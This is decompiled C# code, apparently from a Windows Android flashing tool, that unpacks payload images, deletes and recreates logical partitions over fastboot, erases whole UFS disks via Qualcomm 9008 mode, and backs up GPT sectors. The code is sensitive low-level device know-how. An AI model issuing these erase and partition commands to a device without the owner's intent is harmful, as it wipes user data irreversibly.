				else
				{
					msgred();
					Msg("重启设备...Error\n");
				}
			}
		}
		else
		{
			msgred();
			Msg("刷写分区中出现错误！请仔细检查日志。分析原因再对设备进行操作！\n");
		}
		EnableButtons();
	}

	private async void _178(object sender, object e)
	{
		object CS_0024_003C_003E8__locals30 = new _003C_003Ec__DisplayClass518_0();
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30)._003C_003E4__this = this;
		((UIProcessBar)this.m_c1).Maximum = 100;
		object enumerator = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				nint num = ((((DataGridViewRow)obj).Cells["checke"].Value != null && (bool)((DataGridViewRow)obj).Cells["checke"].Value) ? 1 : 0);
				if (num != 0)
				{
					object obj2 = ((DataGridViewRow)obj).Cells["pathfile"].Value?.ToString();
					if ((string)obj2 != "PayloadInt")
					{
						Msg("并非Payload文件无法进行解包！\n");
						return;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		falseButtons();
		this.m_4c = false;
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).exportDir = ((Control)this.m_133).Text;
		if (!Directory.Exists(((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).exportDir))
		{
			Msg("请选择有效的导出目录!\n");
			EnableButtons();
			return;
		}
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).logProgress = new Progress<string>((string msg) =>
		{
			((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30)._003C_003E4__this.Msg(msg);
		});
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).lastWritten = 0L;
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).lastTime = DateTime.Now;
		((UIProcessBar)this.m_c1).Maximum = 10000;
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).progress = new Progress<(long, long, string)>(((long writtenBytes, long totalBytes, string message) p) =>
		{
			((Control)((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30)._003C_003E4__this.m_cf).Text = p.message;
			DateTime now = DateTime.Now;
			double totalSeconds = (now - ((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).lastTime).TotalSeconds;
			if (totalSeconds >= 0.2)
			{
				long num3 = Math.Max(0L, p.writtenBytes - ((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).lastWritten);
				double bytesPerSecond = (double)num3 / totalSeconds;
				((Control)((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30)._003C_003E4__this.m_cd).Text = (string)(((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30)._003C_003E4__this._17a(bytesPerSecond) ?? "");
				((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).lastWritten = p.writtenBytes;
				((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).lastTime = now;
			}
			if (p.totalBytes > 0)
			{
				((UIProcessBar)((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30)._003C_003E4__this.m_c1).Value = Math.Min((int)(p.writtenBytes * 10000 / p.totalBytes), 10000);
			}
		});
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).autoThreads = true;
		if (((Control)this.m_134).Text == "自动")
		{
			((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).autoThreads = true;
		}
		else
		{
			((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).autoThreads = false;
		}
		((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).maxThreads = 128;
		if (!((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).autoThreads)
		{
			int.TryParse(((Control)this.m_134).Text, out ((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).maxThreads);
			if (((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).maxThreads <= 0)
			{
				((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).maxThreads = 1;
			}
		}
		object enumerator2 = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator2).MoveNext())
			{
				object obj3 = (DataGridViewRow)((IEnumerator)enumerator2).Current;
				object CS_0024_003C_003E8__locals38 = new _003C_003Ec__DisplayClass518_1();
				((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30;
				if (this.m_4c)
				{
					Log2("导出操作取消！\n", Color.Red, isBold: true);
					EnableButtons();
					return;
				}
				nint num2 = ((((DataGridViewRow)obj3).Cells["checke"].Value != null && (bool)((DataGridViewRow)obj3).Cells["checke"].Value) ? 1 : 0);
				if (num2 == 0)
				{
					continue;
				}
				((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).partitionName = ((DataGridViewRow)obj3).Cells["Pname"].Value?.ToString();
				object obj4 = await Task.Run(() => ((Payload)((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1._003C_003E4__this.m_7f).ExtractAsync(((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).partitionName, ((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1.exportDir, false, ((Checkbox)((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1._003C_003E4__this.m_16d).Checked, (IProgress<(long writtenBytes, long totalBytes, string message)>)((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1.progress, (Action<string>)((string msg) =>
				{
					((IProgress<string>)((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1.logProgress).Report(msg);
				}), ((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1.autoThreads, ((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).CS_0024_003C_003E8__locals1.maxThreads));
				if (obj4 != null)
				{
					Msg("分区 " + ((_003C_003Ec__DisplayClass518_1)CS_0024_003C_003E8__locals38).partitionName + " 导出失败: " + ((Exception)obj4).Message + "\n");
				}
			}
		}
		finally
		{
			if (enumerator2 is IDisposable disposable2)
			{
				disposable2.Dispose();
			}
		}
		Msg("导出文件操作结束！\n");
		await _16a(((_003C_003Ec__DisplayClass518_0)CS_0024_003C_003E8__locals30).exportDir);
		EnableButtons();
	}

	private async Task _179()
	{
		try
		{
			nint num = 0;
			object enumerator = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (((DataGridViewRow)obj).Cells["checke"].Value == null || !(bool)((DataGridViewRow)obj).Cells["checke"].Value || !((((DataGridViewRow)obj).Cells["Pname"].Value?.ToString())?.Equals("lk", StringComparison.OrdinalIgnoreCase) ?? false))
					{
						continue;
					}
					num = 1;
					break;
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if ((int)num != 0)
			{
				Msg("当前为:MTK设备\n");
			}
			else
			{
				Msg("当前为:高通设备\n");
			}
			object obj2 = new CancellationTokenSource(TimeSpan.FromSeconds(5.0));
			try
			{
				object obj3 = await _149(((CancellationTokenSource)obj2).Token, "getvar current-slot");
				if (string.IsNullOrEmpty((string)obj3))
				{
					msgred();
					fe("超时\n");
					return;
				}
				object obj4 = Regex.Match((string)obj3, "current-slot:\\s*([a-zA-Z0-9_-]+)");
				object obj5 = (((Group)obj4).Success ? ((Match)obj4).Groups[1].Value : null);
				if (string.IsNullOrEmpty((string)obj5))
				{
					Msg("未能识别槽位\n");
					return;
				}
				Msg("当前槽位: " + (string)obj5 + "\n");
				object obj6 = new string[8] { "system_", "odm_", "vendor_", "product_", "system_ext_", "system_dlkm_", "vendor_dlkm_", "odm_dlkm_" };
				object obj7 = new string[2] { "a", "b" };
				object obj8 = obj6;
				for (nint num2 = 0; num2 < ((Array)obj8).Length; num2++)
				{
					object obj9 = ((object[])obj8)[num2];
					object obj10 = obj7;
					for (nint num3 = 0; num3 < ((Array)obj10).Length; num3++)
					{
						object obj11 = ((object[])obj10)[num3];
						object obj12 = (string)obj9 + (string)obj11;
						Msg("[Super]删除分区: " + (string)obj12 + "...");
						object obj13 = await _149(((CancellationTokenSource)obj2).Token, "delete-logical-partition " + (string)obj12);
						if (string.IsNullOrEmpty((string)obj13) || ((string)obj13).IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0 || ((string)obj13).IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0)
						{
							msgred();
							fe("删除失败: " + (string)obj13 + "\n");
						}
						else
						{
							fa();
							fe("OK\n");
							await Task.Delay(300);
						}
					}
				}
				object enumerator2 = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator2).MoveNext())
					{
						object obj14 = (DataGridViewRow)((IEnumerator)enumerator2).Current;
						if (((DataGridViewRow)obj14).Cells["Pname"].Value == null)
						{
							continue;
						}
						object obj15 = ((DataGridViewRow)obj14).Cells["Pname"].Value.ToString();
						if (!((string)obj15).StartsWith("my", StringComparison.OrdinalIgnoreCase))
						{
							continue;
						}
						object obj16 = obj7;
						for (nint num4 = 0; num4 < ((Array)obj16).Length; num4++)
						{
							object obj17 = ((object[])obj16)[num4];
							object obj18 = (string)obj15 + "_" + (string)obj17;
							Msg("[Super]删除 my 分区: " + (string)obj18 + "...");
							object obj19 = await _149(((CancellationTokenSource)obj2).Token, "delete-logical-partition " + (string)obj18);
							if (string.IsNullOrEmpty((string)obj19) || ((string)obj19).IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0 || ((string)obj19).IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0)
							{
								msgred();
								fe("删除失败: " + (string)obj19 + "\n");
							}
							else
							{
								fa();
								fe("OK\n");
								await Task.Delay(300);
							}
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable disposable2)
					{
						disposable2.Dispose();
					}
				}
				object obj20 = obj6;
				for (nint num5 = 0; num5 < ((Array)obj20).Length; num5++)
				{
					object obj21 = ((object[])obj20)[num5];
					object obj22 = (string)obj21 + (string)obj5;
					Msg("[Super]创建分区: " + (string)obj22 + "...");
					object obj23 = await _149(((CancellationTokenSource)obj2).Token, "create-logical-partition " + (string)obj22 + " 1");
					if (string.IsNullOrEmpty((string)obj23) || ((string)obj23).IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0 || ((string)obj23).IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0)
					{
						msgred();
						fe("创建失败: " + (string)obj23 + "\n");
					}
					else
					{
						fa();
						Msg("OK\n");
						await Task.Delay(300);
					}
				}
				object enumerator3 = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator3).MoveNext())
					{
						object obj24 = (DataGridViewRow)((IEnumerator)enumerator3).Current;
						if (((DataGridViewRow)obj24).Cells["Pname"].Value == null)
						{
							continue;
						}
						object obj25 = ((DataGridViewRow)obj24).Cells["Pname"].Value.ToString();
						if (((string)obj25).StartsWith("my", StringComparison.OrdinalIgnoreCase))
						{
							object obj26 = (string)obj25 + "_" + (string)obj5;
							Msg("[Super]创建 my 分区: " + (string)obj26 + "...");
							object obj27 = await _149(((CancellationTokenSource)obj2).Token, "create-logical-partition " + (string)obj26 + " 1");
							if (string.IsNullOrEmpty((string)obj27) || ((string)obj27).IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0 || ((string)obj27).IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0)
							{
								msgred();
								fe("创建失败: " + (string)obj27 + "\n");
							}
							else
							{
								fa();
								Msg("OK\n");
								await Task.Delay(300);
							}
						}
					}
				}
				finally
				{
					if (enumerator3 is IDisposable disposable3)
					{
						disposable3.Dispose();
					}
				}
			}
			finally
			{
				((IDisposable)obj2)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj28 = ex;
			object msg = "错误: " + ((Exception)obj28).Message;
			Msg((string)msg);
		}
	}

	private object _17a(double bytesPerSecond)
	{
		string[] array = new string[5] { "B/s", "KB/s", "MB/s", "GB/s", "TB/s" };
		double num = bytesPerSecond;
		int num2 = 0;
		while (num >= 1024.0 && num2 < array.Length - 1)
		{
			num /= 1024.0;
			num2++;
		}
		return $"{num:F2} {array[num2]}";
	}

	private void _17b(object sender, EventArgs e)
	{
	}

	private object _17c(long bytes)
	{
		double num = (double)bytes / 1024.0;
		if (num < 1024.0)
		{
			return $"{num:F2} KB";
		}
		double num2 = num / 1024.0;
		if (num2 < 1024.0)
		{
			return $"{num2:F2} MB";
		}
		double num3 = num2 / 1024.0;
		return $"{num3:F2} GB";
	}

	private async void _17d(object sender, object e)
	{
		this.m_4c = false;
		if (((DataGridView)this.m_16e).Rows.Count == 0)
		{
			Msg("请选择镜像包\n");
			return;
		}
		object enumerator = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (DataGridViewRow)((IEnumerator)enumerator).Current;
				nint num = ((((DataGridViewRow)obj).Cells["checke"].Value != null && (bool)((DataGridViewRow)obj).Cells["checke"].Value) ? 1 : 0);
				if (num != 0)
				{
					object obj2 = ((DataGridViewRow)obj).Cells["pathfile"].Value?.ToString();
					if ((string)obj2 == "PayloadInt")
					{
						Msg("请先解包BIn文件进行操作！\n");
						return;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		object obj3 = new HashSet<string> { "boot", "dtbo", "recovery", "vbmeta", "vendor_boot", "modem", "lk", "md1img" };
		falseButtons();
		Msg("等待FastbootD设备连接...\n");
		object enumerator2 = ((IEnumerable)((DataGridView)this.m_16e).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator2).MoveNext())
			{
				object obj4 = (DataGridViewRow)((IEnumerator)enumerator2).Current;
				object obj5 = ((DataGridViewRow)obj4).Cells["Pname"].Value?.ToString();
				object obj6 = ((DataGridViewRow)obj4).Cells["pathfile"].Value?.ToString();
				if (!string.IsNullOrEmpty((string)obj5) && !string.IsNullOrEmpty((string)obj6) && ((HashSet<string>)obj3).Contains((string)obj5))
				{
					if (this.m_4c)
					{
						Log2("写入已取消", Color.Red, isBold: true);
						EnableButtons();
						return;
					}
					nint num2 = ((await _174(obj5, obj6)) ? 1 : 0);
					IntPtr intPtr = num2;
					if ((int)(nint)intPtr != 0)
					{
						_172("[Payload] 刷写 " + (string)obj5 + " ...", "OK", Color.DodgerBlue);
					}
					else
					{
						_172("[Payload] 刷写 " + (string)obj5 + " ...", "Error", Color.Red);
					}
				}
			}
		}
		finally
		{
			if (enumerator2 is IDisposable disposable2)
			{
				disposable2.Dispose();
			}
		}
		Msg("清楚状态缓存...");
		try
		{
			object path = "C:\\TMFTool";
			object obj7 = Path.Combine((string)path, "zero.img");
			if (!File.Exists((string)obj7))
			{
				object obj8 = new FileStream((string)obj7, FileMode.Create, FileAccess.Write);
				try
				{
					object zero = Resources.zero;
					((Stream)obj8).Write((byte[])zero, 0, ((Array)zero).Length);
				}
				finally
				{
					((IDisposable)obj8)?.Dispose();
				}
			}
			object obj9 = new CancellationTokenSource(TimeSpan.FromSeconds(10.0));
			try
			{
				object obj10 = await _149(((CancellationTokenSource)obj9).Token, "flash misc " + (string)obj7);
				if (string.IsNullOrEmpty((string)obj10) || ((string)obj10).IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0 || ((string)obj10).IndexOf("fail", StringComparison.OrdinalIgnoreCase) >= 0)
				{
					msgred();
					fe((string)obj10 + "\n");
				}
				else
				{
					fa();
					Msg("OK\n");
				}
			}
			finally
			{
				((IDisposable)obj9)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj11 = ex;
			Msg(((Exception)obj11).Message + "\n");
			EnableButtons();
			return;
		}
		EnableButtons();
		Msg("FastbootD 所需分区修复完成!请尝试进入！同安卓版本生效\n");
	}

	private async void _17e(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			DialogResult dialogResult = MessageBox.Show("确定擦除整个磁盘？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
			if (dialogResult != DialogResult.Yes)
			{
				return;
			}
			object obj = new _003C_003Ec__DisplayClass524_0();
			((_003C_003Ec__DisplayClass524_0)obj)._003C_003E4__this = this;
			object value = ((Control)this.m_126).Text.Trim();
			if (string.IsNullOrEmpty((string)value))
			{
				MessageBox.Show("请填写端口号", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			((_003C_003Ec__DisplayClass524_0)obj).ConRes = -2;
			if (((UIRadioButton)this.m_da).Checked)
			{
				((_003C_003Ec__DisplayClass524_0)obj).UFS = "4096";
			}
			else
			{
				((_003C_003Ec__DisplayClass524_0)obj).UFS = "512";
			}
			object CS_0024_003C_003E8__locals29 = new _003C_003Ec__DisplayClass524_1();
			((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass524_0)obj;
			((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl = new SerialPort(((Control)this.m_126).Text, 9600);
			try
			{
				try
				{
					((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl.Open();
				}
				catch
				{
					msgred();
					Msg("无法打开端口\n");
					return;
				}
				await Task.Run(async () =>
				{
					if (((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.UFS == "4096")
					{
						nint num3 = 0;
						while (num3 <= 5)
						{
							nint num4 = await LinQcPortClass.ERasexml(xml: string.Format(Firehose.ERASE, ((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.UFS, (int)num3), SePort: ((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl);
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.ConRes = (int)num4;
							if (((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.ConRes != 1)
							{
								((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg($"擦除LUN{(int)num3}... ");
								((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.msgred();
								((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.fe("Error\n");
								break;
							}
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg($"擦除LUN{(int)num3}...");
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.fa();
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("OK\n");
							int num5 = (int)num3;
							num3 = num5 + 1;
						}
					}
					else if (((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.UFS == "512")
					{
						nint num6 = await LinQcPortClass.ERasexml(xml: string.Format(Firehose.ERASE, ((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.UFS, 0), SePort: ((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl);
						((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.ConRes = (int)num6;
						if (((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.ConRes == 1)
						{
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("擦除LUN0...");
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.fa();
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("OK\n");
						}
						else
						{
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("擦除LUN0...");
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.msgred();
							((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1._003C_003E4__this.fe("Error\n");
						}
					}
				});
				((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl.Close();
				if (((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).CS_0024_003C_003E8__locals1.ConRes == 1)
				{
					fa();
					Msg("擦除磁盘完成\n");
					((Control)this.m_cf).Text = "擦除磁盘完成";
				}
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass524_1)CS_0024_003C_003E8__locals29).SepSl).Dispose();
				}
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private object _17f(object node, object tagName)
	{
		XmlNode xmlNode = ((XmlNode)node).SelectSingleNode((string)tagName);
		return (xmlNode != null) ? xmlNode.InnerText : string.Empty;
	}

	private async void _180(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		object obj = new OpenFileDialog();
		try
		{
			((FileDialog)obj).Title = "请选择rawprogram*.xml";
			((FileDialog)obj).Filter = "XML files (rawprogram*.xml)|rawprogram0.xml;rawprogram1.xml;rawprogram2.xml;rawprogram3.xml;rawprogram4.xml;rawprogram5.xml;rawprogram6.xml;rawprogram7.xml;rawprogram8.xml;*unsparse*.xml";
			((OpenFileDialog)obj).Multiselect = true;
			if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
			{
				return;
			}
			_17 = ((FileDialog)obj).FileNames;
			if (((Array)_17).Length != 0)
			{
				object directoryName = Path.GetDirectoryName((string)((object[])_17)[0]);
				this.path = (string)directoryName;
			}
			((List<RawPartition>)this.m_3e).Clear();
			object obj2 = _17;
			for (nint num2 = 0; num2 < ((Array)obj2).Length; num2++)
			{
				object obj3 = ((object[])obj2)[num2];
				try
				{
					object obj4 = XDocument.Load((string)obj3);
					object obj5 = ((XContainer)obj4).Descendants((XName)"program");
					object enumerator = ((IEnumerable<XElement>)obj5).GetEnumerator();
					try
					{
						while (((IEnumerator)enumerator).MoveNext())
						{
							object current = ((IEnumerator<XElement>)enumerator).Current;
							object obj6 = ((XElement)current).Attribute((XName)"label")?.Value;
							if ((string)obj6 == "PrimaryGPT" || (string)obj6 == "BackupGPT")
							{
								object path = ((XElement)current).Attribute((XName)"filename")?.Value;
								object start = ((XElement)current).Attribute((XName)"start_sector")?.Value;
								object numsector = ((XElement)current).Attribute((XName)"num_partition_sectors")?.Value;
								object physicalNum = ((XElement)current).Attribute((XName)"physical_partition_number")?.Value;
								object obj7 = ((XElement)current).Attribute((XName)"SECTOR_SIZE_IN_BYTES")?.Value;
								if (((string)obj7).Contains("4096"))
								{
									((UIRadioButton)this.m_da).Checked = true;
								}
								else if (((string)obj7).Contains("512"))
								{
									((UIRadioButton)this.m_d9).Checked = true;
								}
								object file = Path.Combine(this.path, (string)path);
								((List<RawPartition>)this.m_3e).Add(new RawPartition((string)obj6, (string)file, "", (string)start, (string)obj7, (string)numsector, (string)physicalNum, download: true));
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
					((RichTextBox)this.m_c8).SelectionColor = Color.Black;
					((TextBoxBase)this.m_c8).AppendText("Reading Xml: ");
					((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
					((TextBoxBase)this.m_c8).AppendText(Path.GetFileName((string)obj3) + "\n");
					((TextBoxBase)this.m_c8).ScrollToCaret();
				}
				catch (Exception ex)
				{
					Console.WriteLine("Error loading XML file " + (string)obj3 + ": " + ex.Message);
				}
			}
			this.m_47 = OpreationMain.WriteFlash;
			((Control)this.m_126).Text.Trim();
			if (((Control)this.m_126).Text.Contains("COM"))
			{
				PortQcom = ((Control)this.m_126).Text;
				_4b();
			}
			else
			{
				MessageBox.Show("端口都没有进你虚空刷机吗", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				EnableButtons();
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async void _181(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
		}
		else if (((Control)this.m_126).Text.Contains("COM"))
		{
			PortQcom = ((Control)this.m_126).Text;
			nint num2 = ((await _26()) ? 1 : 0);
			if ((int)num2 != 0)
			{
				this.m_47 = OpreationMain.ReadFlash;
				_48 = READPartition.ReadPart;
				object start = "0";
				object sectorSize = "4096";
				object numsector = "6";
				if (!((UIRadioButton)this.m_da).Checked)
				{
					sectorSize = "512";
					numsector = "34";
				}
				((List<RawPartition>)this.m_3e).Clear();
				nint num3 = 0;
				while (num3 < 6)
				{
					object name = $"gpt_main{(int)num3}";
					object physicalNum = ((int)num3).ToString();
					((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, "", "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					int num4 = (int)num3;
					num3 = num4 + 1;
				}
				object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				object obj = DateTime.Now.ToString("yyyyMMdd_HHmmss");
				object path = "TMFToolBuackGPT_" + (string)obj;
				object bACKUPFOLDER_Path = Path.Combine((string)folderPath, (string)path);
				Directory.CreateDirectory((string)bACKUPFOLDER_Path);
				BACKUPFOLDER_Path = (string)bACKUPFOLDER_Path;
				RAWCreator.CreatedRawProgram((List<RawPartition>)this.m_3e, BACKUPFOLDER_Path);
				((Control)this.m_126).Text.Trim();
				Msg("保存位置:" + BACKUPFOLDER_Path + "\n");
				if (((Control)this.m_126).Text.Contains("COM"))
				{
					PortQcom = ((Control)this.m_126).Text;
					_4b();
				}
				else
				{
					MessageBox.Show("端口都没有进你虚空刷机吗", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					EnableButtons();
				}
			}
			else
			{
				Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
			}
		}
		else
		{
			Message.error((Form)(object)this, "未进入9008端口", (Font)null, (int?)null);
		}
	}

	private static void _182(object writer, object reader, object command)
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		byte[] bytes = Encoding.ASCII.GetBytes(((string)command).PadRight(64, '\0'));
		Console.WriteLine("发送命令: " + (string)command);
		int num = default;
		((UsbEndpointWriter)writer).Write(bytes, 5000, out num);
		_183(reader);
	}

	private static void _183(object reader)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		byte[] array = new byte[64];
		int count = default;
		((UsbEndpointReader)reader).Read(array, 5000, out count);
		string text = Encoding.ASCII.GetString(array, 0, count).Trim(default(char));
		Console.WriteLine("Fastboot 响应: " + text);
		if (text.StartsWith("FAIL"))
		{
			throw new Exception(text);
		}
	}

	private async void _184(object sender, object e)
	{
		if (!((string)this.m_2b == "vipuser") && !((string)this.m_2b == "admin"))
		{
			msgred();
			Msg("你的账户权限不足!联系管理员\n");
			return;
		}
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object source = new int[1] { 6353 };
		object source2 = new int[3] { 53261, 20192, 20193 };
		object obj = new byte[256];
		object obj2 = ((Array)obj).Length.ToString("X8").ToLower();
		object obj3 = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity");
		Msg("连接设备...");
		object enumerator = ((ManagementObjectSearcher)obj3).Get().GetEnumerator();
		try
		{
			int num7 = default;
